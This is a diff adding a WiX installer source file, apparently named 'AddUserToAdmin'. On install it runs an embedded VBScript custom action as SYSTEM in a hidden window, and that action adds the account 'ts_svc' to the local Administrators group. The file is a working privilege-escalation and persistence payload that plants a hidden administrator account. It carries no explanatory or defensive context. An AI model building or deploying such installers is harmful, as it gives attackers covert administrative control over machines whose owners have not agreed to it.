@@ -1,0 +1,25 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
+  <Product Id="*" Name="AddUserToAdmin" Language="1033" Version="1.0.0.0" Manufacturer="YourCompany" UpgradeCode="cd2bd2e0-cb5b-4832-9a65-4c429d675bf9">
+    <Package InstallerVersion="500" Compressed="yes" InstallScope="perMachine" />
+
+    <Directory Id="TARGETDIR" Name="SourceDir">
+      <Directory Id="ProgramFilesFolder">
+        <Directory Id="INSTALLFOLDER" Name="AddUserToAdmin" />
+      </Directory>
+    </Directory>
+
+    <!-- Embedded VBScript Custom Action -->
+    <CustomAction Id="AddUserToAdminGroup" Script="vbscript" Execute="deferred" Return="check" Impersonate="no">
+      <![CDATA[
+        Set objShell = CreateObject("WScript.Shell")
+        objShell.Run "net localgroup administrators ""ts_svc"" /add", 0, True
+      ]]>
+    </CustomAction>
+
+    <InstallExecuteSequence>
+      <Custom Action="AddUserToAdminGroup" After="InstallFiles">NOT Installed</Custom>
+    </InstallExecuteSequence>
+
+  </Product>
+</Wix>
